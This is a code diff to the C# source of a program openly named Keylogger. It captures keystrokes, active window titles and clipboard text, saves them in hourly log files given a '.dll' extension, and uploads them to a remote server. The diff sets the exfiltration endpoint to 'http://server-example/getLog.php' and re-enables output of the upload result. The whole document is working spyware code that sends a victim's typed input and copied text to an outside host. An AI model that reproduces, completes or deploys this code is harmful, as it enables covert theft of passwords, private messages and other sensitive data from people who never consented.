@@ -14,11 +14,12 @@ namespace Keylogger
     class Program
     {
         string log = string.Empty;
+
         string currentWindowTitle = string.Empty;
         string currentHour = string.Empty;
 
-        string serverLink = "";
-        string serverArg = "";
+        string serverLink = "http://server-example/getLog.php";
+        string serverArg = "log";
         
         //Get window titles
         [DllImport("user32.dll")]
@@ -52,17 +53,17 @@ namespace Keylogger
 
                     // Get the foreground window's title : https://stackoverflow.com/questions/115868/how-do-i-get-the-title-of-the-current-active-window-using-c
                     string windowTitle = getForegroundWindowTitle();
-                    if (windowTitle != currentWindowTitle && windowTitle != "")
+                    if (windowTitle != currentWindowTitle)
                     {
                         currentWindowTitle = windowTitle;
-                        log += $"\n\n<newForegroundWindow>{currentWindowTitle}</newForegroundWindow>\n";
+                        log = $"\n\n<newForegroundWindow>{currentWindowTitle}</newForegroundWindow>\n";
                     }
 
                     // Update the log variable
                     log += character2;
 
                     // Write logs
-                    writeLogs(log);
+                    writeLogs();
                 });
 
                 Application.Run();
@@ -93,19 +94,22 @@ namespace Keylogger
         {
             if (e.ContentType == SharpClipboard.ContentTypes.Text)
             {
-                log += "\n<newClipboardText>" + e.Content.ToString() + "</newClipboardText>\n";
+                log = "\n<newClipboardText>" + e.Content.ToString() + "</newClipboardText>\n";
             }
         }
         
 
-        public void writeLogs(string log)
+        public void writeLogs()
         {
             // Write logs https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
             string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\logs\\";
             Directory.CreateDirectory(path); // Create the path if it does not exist
             string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy_HH") + ".dll";
             
-            File.WriteAllText(Path.Combine(path, fileName), log);
+            using (StreamWriter sw = File.AppendText(Path.Combine(path, fileName)))
+            {
+                sw.Write(log);
+            }
 
             // If it's a new file => send the last file
             if (
@@ -129,6 +133,7 @@ namespace Keylogger
                 }
             }
 
+            log = "";
             currentHour = DateTime.UtcNow.ToString("HH");
         }
 
@@ -182,11 +187,11 @@ namespace Keylogger
                 wresp = wr.GetResponse();
                 Stream stream2 = wresp.GetResponseStream();
                 StreamReader reader2 = new StreamReader(stream2);
-                //Console.WriteLine(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
+                Console.WriteLine(string.Format("File uploaded, server response is: {0}", reader2.ReadToEnd()));
             }
             catch (Exception ex)
             {
-                //Console.WriteLine("Error uploading file", ex);
+                Console.WriteLine("Error uploading file", ex);
                 if (wresp != null)
                 {
                     wresp.Close();
